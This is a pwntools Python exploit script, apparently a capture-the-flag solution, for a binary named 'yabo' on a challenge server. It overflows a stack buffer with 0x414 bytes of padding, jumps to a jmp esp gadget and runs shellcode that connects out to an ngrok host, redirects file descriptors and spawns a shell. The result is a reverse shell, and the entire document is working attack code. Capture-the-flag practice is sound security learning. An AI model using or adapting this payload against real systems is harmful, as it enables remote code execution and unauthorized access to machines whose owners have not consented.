#!/usr/bin/python

from pwn import *

PATH = './yabo'

GDBSCRIPT = '''

'''

HOST = 'challenge.ctf.games'
PORT = 31760

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def exploit(r):
    pause()
    jmp_esp = 0x080492e2 # jmp esp

    payload  = b'A' * 0x414
    payload += p32(jmp_esp)
    payload += asm(shellcraft.connect('0.tcp.ngrok.io', 10696))
    payload += asm(shellcraft.dup2(5, 0))
    payload += asm(shellcraft.dup2(5, 1))
    payload += asm(shellcraft.dup2(5, 2))
    payload += asm(shellcraft.sh())

    r.recv()
    r.send(payload)

    # debug(GDBSCRIPT)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    # libc = ELF(elf.libc.path)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)